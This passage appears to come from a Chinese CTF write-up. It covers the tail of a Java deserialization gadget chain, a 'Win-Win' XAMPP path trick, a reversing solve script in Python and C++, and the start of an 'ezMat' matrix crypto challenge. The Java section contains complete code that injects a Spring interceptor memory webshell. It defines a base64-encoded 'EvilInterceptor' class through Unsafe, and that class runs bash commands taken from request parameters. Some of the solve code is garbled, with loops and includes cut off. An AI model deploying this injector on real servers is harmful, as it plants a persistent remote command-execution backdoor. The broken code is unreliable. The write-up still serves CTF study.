            }
            Reflections.setAccessible(f2);
            Object[] array = (Object[]) ((Object[]) f2.get(innimpl));
            Object node = array[0];
            if (node == null) {
                node = array[1];
            }
            Field keyField = null;
            try {
                keyField = node.getClass().getDeclaredField("key");
            } catch (Exception var16) {
                keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
            }
            Reflections.setAccessible(keyField);
            keyField.set(node, entry);
            return map;
        }
    }
但是服务不出网，无法反弹shell，需要写入内存马，通过ScriptManager来注入内存马：
    org.springframework.web.context.request.ServletRequestAttributes servletRequestAttributes = (org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes();
            javax.servlet.http.HttpServletRequest req = ((org.springframework.web.context.request.ServletRequestAttributes) servletRequestAttributes).getRequest();
            org.springframework.web.context.WebApplicationContext context = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(req.getServletContext());
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping);
            java.lang.String className = "com.example.memshell_spring_boot.evil.EvilInterceptor";
            java.lang.String b64 = "yv66vgAAADQAeQoAGgA8CAAyCwA9AD4IAD8KAEAAQQcAQggAQwgARAoAQABFCgBGAEcKAEYASAoARgBJBwBKCgANADwKAA0ASwgATAoADQBNCgBOAE8KAE4AUAoABgBRCgANAFIIAFMLAFQAVQoAVgBXBwBYBwBZAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADdMY29tL2V4YW1wbGUvbWVtc2hlbGxfc3ByaW5nX2Jvb3QvZXZpbC9FdmlsSW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3Rkb3V0AQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAGc3RkZXJyAQAKc3Rkb3V0QnVmZgEAAltCAQAKc3RkZXJyQnVmZgEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQADcmVzAQANU3RhY2tNYXBUYWJsZQcAQgEACkV4Y2VwdGlvbnMHAFoBABBNZXRob2RQYXJhbWV0ZXJzAQAKU291cmNlRmlsZQEAFEV2aWxJbnRlcmNlcHRvci5qYXZhDAAbABwHAFsMAFwAXQEAAAcAXgwAXwBgAQAQamF2YS9sYW5nL1N0cmluZwEACS9iaW4vYmFzaAEAAi1jDABhAGIHAGMMAGQAZQwAZgBnDABoAGcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAaQBqAQAjLS0tLS0tLS0tLS0tLXN0ZG91dC0tLS0tLS0tLS0tLS0tLQoMAGsAbAcAbQwAbgBlDABvAHAMABsAcQwAaQByAQAjLS0tLS0tLS0tLS0tLXN0ZGVyci0tLS0tLS0tLS0tLS0tLQoHAHMMAHQAdQcAdgwAdwB4AQA1Y29tL2V4YW1wbGUvbWVtc2hlbGxfc3ByaW5nX2Jvb3QvZXZpbC9FdmlsSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAHd2FpdEZvcgEAAygpSQEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAA5nZXRFcnJvclN0cmVhbQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQAEcmVhZAEABShbQilJAQAFKFtCKVYBABwoQylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhABkAGgAAAAAAAgABABsAHAABAB0AAAAvAAEAAQAAAAUqtwABsQAAAAIAHgAAAAYAAQAAAAkAHwAAAAwAAQAAAAUAIAAhAAAAAQAiACMAAwAdAAAB6gAFAAsAAAEDKxICuQADAgA6BBIEOgUZBMYA8bgABQa9AAZZAxIHU1kEEghTWQUZBFO2AAk6BhkGtgAKVxkGtgALOgcZBrYADDoIuwANWbcADhkFtgAPEhC2AA+2ABE6BRkHtgASvAg6CRkHGQm2ABNXuwANWbcADhkFtgAPuwAGWRkJtwAUtgAPtgAROgW7AA1ZtwAOGQW2AA8QCrYAFbYAEToFuwANWbcADhkFtgAPEha2AA+2ABE6BRkItgASvAg6ChkIGQq2ABNXuwANWbcADhkFtgAPuwAGWRkKtwAUtgAPtgAROgW7AA1ZtwAOGQW2AA8QCrYAFbYAEToFLLkAFwEAGQW2ABgErAAAAAMAHgAAAE4AEwAAAAsACgAMAA4ADQATAA4ALgAPADQAEAA7ABEAQgASAFgAEwBhABQAaQAVAIYAFgCcABcAsgAYALsAGQDDABoA4AAbAPYAHAEBAB4AHwAAAHAACwAuANMAJAAlAAYAOwDGACYAJwAHAEIAvwAoACcACABhAKAAKQAqAAkAuwBGACsAKgAKAAABAwAgACEAAAAAAQMALAAtAAEAAAEDAC4ALwACAAABAwAwADEAAwAKAPkAMgAzAAQADgD1ADQAMwAFADUAAAALAAH9AQEHADYHADYANwAAAAQAAQA4ADkAAAANAwAsAAAALgAAADAAAAABADoAAAACADs=";
            sun.misc.BASE64Decoder mydecoder = (sun.misc.BASE64Decoder)sun.misc.BASE64Decoder.class.newInstance();
            byte[] bytes = mydecoder.decodeBuffer(b64);
            java.lang.ClassLoader classLoader = java.lang.Thread.currentThread().getContextClassLoader();
            java.lang.System.out.println("flight");
            java.lang.System.out.println(classLoader);
            java.lang.System.out.println(className);
            java.lang.System.out.println(bytes);
            java.lang.System.out.println(bytes.length);
            java.lang.reflect.Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
            field.setAccessible(true);
            sun.misc.Unsafe unsafe = field.get(null);
            java.lang.Class cls = unsafe.defineClass("com.example.memshell_spring_boot.evil.EvilInterceptor", bytes, 0, bytes.length, classLoader, java.lang.System.class.getProtectionDomain());
            java.lang.System.out.println("flight2");
            java.lang.System.out.println(cls);
            adaptedInterceptors.add(cls.newInstance());
###  Win-Win
    xampp路径加一层随机字符串
    C:/this_is_a_secret_path_107b1177348cc063a0713838282b1c27892d5fe2/php/tests/parseDir/phpinfo.php
    用通配符> (8*i) & 0xFF for i in range(4)]
        vals = vals[::-1]
        vals = [[x&0xF, x>>4] for x in vals]
        return vals
    def sub_tab(tab, data):
        vals = [split_byte(tab[i,data[i]]) for i in range(4)]
        return np.array(vals)
    def wtf(sw, low, high):
        x1 = sw[low[0]+32][low[1]] + 80
        y1 = sw[low[2]+48][low[3]]
        v1 = sw[x1][y1]
        x2 = sw[high[0]][high[1]] + 64
        y2 = sw[high[2]+16][high[3]]
        v2 = sw[x2][y2]
        return v1 | (v2 
    #include 
    #include 
    using namespace std;
    void print(uint8_t *buf)
    {
        for (int i = 0; i > s1, s2;
        for (int i = 0; i second;
                vals[0] = p1.first;
                vals[1] = p1.second;
                vals[2] = p2.first;
                vals[3] = p2.second;
                return;
            }
        }
        puts("bad");
    }
    void hash_inv(uint8_t *buf)
    {
        for (int i = 0; i = 0; --i) {
            reshape(buf, vals);
            for (int j = 3; j >= 0; --j) {
                sub_tab_inv(table2[i][j], vals[j]);
                sub_tab_inv(table1[i][j], vals[j]);
            }
            reshape(vals, buf);
            arrange_inv(buf);
        }
    }
    void secure_decrypt_inv(uint8_t *buf)
    {
        for (int i = 0; i < 1337; ++i) {
            printf("round %d\n", i);
            hash_inv(buf);
            print(buf);
        }
    }
    int main()
    {
        uint8_t buf[16] = {};
        secure_decrypt_inv(buf);
        return 0;
    }
###  ezMat
整理一下大致如下：  
E = U*(A+R)
  * E是最后结果，已知
  * U是上三角矩阵
  * A是flag矩阵，分布有规律，其余都是0
  * R是pk公钥，已知
U是上三角矩阵，A的分布我们知道，并且A特别稀疏，所以E中很多位置的值就相当于U*R得到的结果，根据这点可以慢慢恢复出U的每一行，进而通过U每一行的值恢复出对应行的A的值  
从下到上每次能依次求出U的其中一行，然后根据U的值，反推出A的对应行
    p = 71
    E = [
    [31,45,41,12,36,43,45,51,25,2,64],
    [68,24,32,35,52,13,64,10,14,2,40],
    [34,34,64,32,67,25,21,57,31,6,56],
    [7,17,12,33,54,66,28,25,40,23,26],
    [14,65,70,35,67,55,47,36,36,42,57],
    [68,28,33,0,45,52,59,29,52,41,46],
    [60,35,0,21,24,44,49,51,1,6,35],
    [20,21,44,57,23,35,30,28,16,23,0],
    [24,64,54,53,35,42,40,17,3,0,36],
    [32,53,39,47,39,56,52,15,39,8,9],
    [7,57,43,5,38,59,2,25,2,67,12],
    ]
    R = [
    [53,28,20,41,32,17,13,46,34,37,24],
    [0,9,54,25,36,1,21,24,56,51,24],
    [61,41,10,56,57,28,49,4,44,70,34],
    [47,58,36,53,68,66,34,69,22,25,39],